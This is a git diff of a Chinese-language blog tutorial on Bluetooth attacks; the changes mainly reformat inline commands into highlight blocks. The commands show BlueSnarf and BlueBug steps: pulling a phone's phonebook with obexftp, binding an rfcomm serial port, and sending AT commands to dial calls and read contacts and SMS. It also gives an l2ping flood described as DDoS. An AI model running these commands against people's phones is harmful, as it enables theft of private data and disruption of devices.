@@ -59,7 +59,11 @@ share: true
   - obexftp
     >是用于访问移动设备存储器的工具程序
 
-    `obexftp -b 00:0A:D9:15:0B:1C -B 10 -g telecom/pb.vcf`
+    {% highlight shell %}
+
+    obexftp -b 00:0A:D9:15:0B:1C -B 10 -g telecom/pb.vcf
+
+    {% endhighlight %}
 
 + _BlueBug攻击_
   >与BlueSnarf一样，一些存在问题的手机可能会被攻击者通过AT命令操纵，攻击者除了可以下载手机中的信息之外，还可以操纵手机进行拨号、短信发送和互联网访问等活动
@@ -75,17 +79,36 @@ Bluez
 
   - hciconfig
     >使用它来启动蓝牙接口（hci0），查询设备的规格。
-      >>激活设备：`hciconfig hci0 up`
+      >>激活设备：
+
+      {% highlight shell %}
+
+      hciconfig hci0 up
+
+      {% endhighlight %}
+
   - hcitool
     >查询工具。 可以用来查询设备名称，设备ID，设备类别和设备时钟。
       >>hcitool scan
   - hcidump
     > 可以使用这个来嗅探蓝牙通信
   - l2ping
-    `l2ping MAC地址`
+
+    {% highlight shell %}
+
+    l2ping MAC地址
+
+    {% endhighlight %}
+
     >测试与该设备的蓝牙模块之间是否数据可达
   - sdptool
-    `sdptool browse MAC地址`
+
+    {% highlight shell %}
+
+    sdptool browse MAC地址
+
+    {% endhighlight %}
+
     >为了获取手机的控制权，需要连接目标设备的串行端口。所以需要通过蓝牙来搜索关于 串行端口的服务。这里需要使用到sdptool工具
 
 ### SDP工具使用
@@ -113,13 +136,15 @@ Bluez
 
 运行hciconfig可以看到：
 
-~~~
+    {% highlight shell %}
+
     hci0:   Type: BR/EDR  Bus: USB
         BD Address: 28:B2:BD:4F:6A:63  ACL MTU: 8192:128  SCO MTU: 64:128
         UP RUNNING
         RX bytes:503 acl:0 sco:0 events:22 errors:0
         TX bytes:336 acl:0 sco:0 commands:22 errors:0
-~~~
+
+    {% endhighlight %}
 
 从上图可以看出，我们的蓝牙设备是hci0
 
@@ -128,12 +153,19 @@ Bluez
 运行hcitool --help可以查看更多相关命令
 
 * 激活自己的蓝牙
-    `sudo hciconfig hci0 up`
+
+{% highlight shell %}
+
+    sudo hciconfig hci0 up
+
+{% endhighlight %}
+
 要注意的是，激活前蓝牙必须是打开的，否则会出现错误：
 
 * 扫描附近的设备
 
-~~~
+{% highlight shell %}
+
     hcitool scan
 
     root@kali:~# hcitool scan
@@ -142,7 +174,8 @@ Bluez
     00:1C:D4:C9:xx:xx   n/a
     84:DB:AC:15:xx:xx   HUAWEI MT7
     可以看到，发现了我手机的蓝牙了~~
-~~~
+
+{% endhighlight %}
 
 * 连接设备
 
@@ -150,30 +183,45 @@ Bluez
 
 首先需要绑定目的蓝牙设备：
 
-    `sudo rfcomm bind /dev/rfcomm0 E0:A6:70:8C:xx:xx`
+{% highlight shell %}
+
+    sudo rfcomm bind /dev/rfcomm0 E0:A6:70:8C:xx:xx
+
+{% endhighlight %}
+
 注意：上面的这个地址是目的蓝牙设备的硬件地址
 
 接着我们连接它：
 
-    `sudo cat >/dev/rfcomm0`
+{% highlight shell %}
+
+    sudo cat >/dev/rfcomm0
+
+{% endhighlight %}
+
 这是目的蓝牙主机就会弹出一个对话框要求输入pin码，然后主机就会弹出一个对话框，只要输入的和刚才一致就可以通过验证。之后我们发现我的手机已经显示了成功配对的标记了。
 
 * 断开连接
 
 删除绑定（否则在下次使用时会提示设备正忙），命令如下：
 
-    `sudo rfcomm release /dev/rfcomm0`
+{% highlight shell %}
 
+    sudo rfcomm release /dev/rfcomm0
+
+{% endhighlight %}
 
 ### 查看蓝牙设备是否开放串口
 
-1. `hcitool scan `
-2. `l2ping MAC addr.`
-3. `sdptool browse MAC addr. | grep -i "Serial Port0"`
+{% highlight shell %}
+
+1. hcitool scan 
+2. l2ping MAC addr.
+3. sdptool browse MAC addr. | grep -i "Serial Port0"
 
      记录serial port服务的channel
 
-4. `vim /etc/bluetooth/rfcomm.conf`
+4. vim /etc/bluetooth/rfcomm.conf
 
         rfcomm0 {
             bind no;
@@ -182,16 +230,22 @@ Bluez
             comment "xxxxxx";
 
         }
-5. `rfcomm bind /dev/rfcomm0 MAC addr.`
-6. `minicom -m -s`     /dev/rfcomm0
+5. rfcomm bind /dev/rfcomm0 MAC addr.
+6. minicom -m -s     /dev/rfcomm0
 
-7. `minicom -m`
-8. `atdt phone no.拨打电话`
-9.  `at+cpbr=1,100 获得手机通讯录`
-10. `at+cmgl 获得短信`
+7. minicom -m
+8. atdt phone no.拨打电话
+9.  at+cpbr=1,100 获得手机通讯录
+10. at+cmgl 获得短信
+
+{% endhighlight %}
 
 ### l2ping的DDOS
 
 >早期的攻击方式： 向目标主机发送大量畸形的ICMP数据包的方式，使得目标计算机忙于响 应从而达到资源耗尽死机的目的
 
-  `l2ping -f MAC addr.s`
+{% highlight shell %}
+
+  l2ping -f MAC addr.s
+
+{% endhighlight %}
